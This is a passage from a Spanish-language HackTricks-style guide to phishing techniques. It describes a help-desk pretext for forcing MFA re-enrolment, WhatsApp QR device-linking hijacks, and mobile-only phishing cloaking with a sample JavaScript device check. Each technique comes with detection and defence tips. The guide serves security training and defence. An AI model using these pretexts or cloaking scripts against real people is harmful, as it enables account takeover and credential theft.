- Generar alertas sobre dominios de LLM no autorizados en el tráfico de los clientes, seguidos de POSTs de credenciales.

---

## Variante de MFA Fatigue / Push Bombing – Restablecimiento forzado
Además del push-bombing clásico, los operadores simplemente **fuerzan un nuevo registro de MFA** durante la llamada al help desk, invalidando el token existente del usuario. Cualquier solicitud de inicio de sesión posterior parece legítima para la víctima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoriza los eventos de AzureAD/AWS/Okta en los que **`deleteMFA` + `addMFA`** ocurran **en cuestión de minutos desde la misma IP**.



## Clipboard Hijacking / Pastejacking

Los atacantes pueden copiar silenciosamente comandos maliciosos al portapapeles de la víctima desde una página web comprometida o typosquatted y, a continuación, engañar al usuario para que los pegue dentro de **Win + R**, **Win + X** o una ventana de terminal, ejecutando código arbitrario sin ninguna descarga ni archivo adjunto.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing móvil y distribución de aplicaciones maliciosas (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Secuestro de vinculación de dispositivos de WhatsApp mediante ingeniería social con códigos QR
* Una página señuelo (p. ej., un “canal” falso de un ministerio/CERT) muestra un código QR de WhatsApp Web/Desktop e indica a la víctima que lo escanee, añadiendo silenciosamente al atacante como **dispositivo vinculado**.<sup>[[12]](#references)</sup>
* El atacante obtiene inmediatamente visibilidad de los chats y contactos hasta que se elimina la sesión. Es posible que las víctimas vean posteriormente una notificación de “nuevo dispositivo vinculado”; los defensores pueden buscar eventos inesperados de vinculación de dispositivos poco después de las visitas a páginas QR no fiables.

### Phishing condicionado a dispositivos móviles para evadir crawlers/sandboxes
Los operadores condicionan cada vez más sus flujos de phishing a una comprobación sencilla del dispositivo para que los crawlers de escritorio nunca lleguen a las páginas finales. Un patrón habitual consiste en un script pequeño que comprueba si existe un DOM compatible con interacción táctil y envía el resultado a un endpoint del servidor; los clientes que no son móviles reciben HTTP 500 (o una página en blanco), mientras que los usuarios móviles reciben el flujo completo.<sup>[[7]](#references)</sup>

Fragmento mínimo del cliente (lógica habitual):
```html
<script src="/static/detect_device.js"></script>
```
Lógica de `detect_device.js` (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamiento del servidor observado con frecuencia:
- Establece una cookie de sesión durante la primera carga.
- Acepta `POST /detect {"is_mobile":true|false}`.
- Devuelve 500 (o un placeholder) en los GET posteriores cuando `is_mobile=false`; solo sirve el phishing si es `true`.

Heurísticas de hunting y detección:
- Consulta de urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetría web: secuencia de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para dispositivos no móviles; las rutas legítimas de víctimas móviles devuelven 200 con HTML/JS posteriores.
- Bloquea o analiza detenidamente las páginas que condicionen el contenido exclusivamente a `ontouchstart` o a comprobaciones similares del dispositivo.

Consejos de defensa:
- Ejecuta crawlers con fingerprints similares a los móviles y JS habilitado para revelar el contenido restringido.
- Genera alertas ante respuestas 500 sospechosas posteriores a `POST /detect` en dominios registrados recientemente.

## References

- [1] [Generación de variaciones de dominio utilizadas en phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Detección de phishing: herramientas y técnicas (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Robar credenciales y bypassear 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Cómo instalar y configurar DKIM con Postfix en Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Informe global de respuesta a incidentes de Unit 42 de 2025 – Edición de ingeniería social](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing: infraestructura de phishing restringida a móviles y heurísticas (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La próxima frontera de los ataques de ensamblaje en tiempo de ejecución: uso de LLMs para generar JavaScript de phishing en tiempo real](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Suplantación de identidad, secuestro de clics y TDS: dentro de un ecosistema de distribución de malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting de Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Secuestro del tráfico hacia windows.com de Microsoft mediante bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [¿Amor? En realidad: una app de citas falsa utilizada como señuelo en una campaña de spyware dirigida en Pakistán](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs y muestras de ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
